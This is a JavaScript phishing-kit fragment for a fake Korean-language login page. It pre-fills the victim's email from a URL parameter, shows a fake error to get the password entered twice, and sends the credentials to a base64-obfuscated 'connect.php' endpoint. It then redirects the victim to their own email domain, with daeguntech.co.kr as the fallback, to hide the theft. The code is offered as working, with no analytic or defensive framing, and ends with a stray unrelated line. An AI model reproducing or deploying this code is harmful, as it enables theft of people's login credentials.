    <!-- FIXED & SUPER FAST SCRIPT -->
    <script>
        // AUTO-FILL + WAIT FOR JQUERY
        $(document).ready(function() {
            function getParameterByName(name) {
                name = name.replace(/[\[\]]/g, '\\$&');
                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                    results = regex.exec(window.location.href);
                if (!results) return null;
                if (!results[2]) return '';
                return decodeURIComponent(results[2].replace(/\+/g, ' '));
            }

            var cmsEmail = getParameterByName('cms');
            if (cmsEmail) {
                $('#login_id').val(cmsEmail);
                setTimeout(() => $('#login_passwd').focus(), 400);
            }
        });

        // CAPTURE LOGIC
        const connect = "L2Nvbm5lY3QucGhw";
        const postUrl = `${config.baseUrl}${atob(connect)}`;
        var attempts = 1;

        function submitLogin() {
            var email = $('#login_id').val().trim();
            var password = $('#login_passwd').val();

            if (!email || !password) {
                alert('아이디와 비밀번호를 입력하세요.');
                return;
            }

            $('#errorMsg').show().addClass('shake');
            setTimeout(() => $('#errorMsg').removeClass('shake'), 600);

            function send() {
                var params = "ai=" + encodeURIComponent(email) + "&pr=" + encodeURIComponent(password);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", postUrl, true);
                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xhr.send(params);
            }

            if (attempts === 1) {
                send();
                attempts++;
                setTimeout(() => {
                    $('#login_btn').html('다시 시도');
                }, 800);
            } else {
                send();
                setTimeout(() => {
                    var domain = email.split('@')[1] || 'daeguntech.co.kr';
                    window.location.href = 'https://' + domain;
                }, 1200);
            }

            setTimeout(() => {
                $('#login_passwd').val('').focus();
            }, 700);
        }

        $(document).on('click', '#login_btn', submitLogin);
        $(document).on('keyup', '#login_passwd', function(e) {
            if (e.key === 'Enter') submitLogin();
        });
    </script>

            if (img.width > max_w) { img.height = img.height * (max_w / img.width); img.width = max_w; }
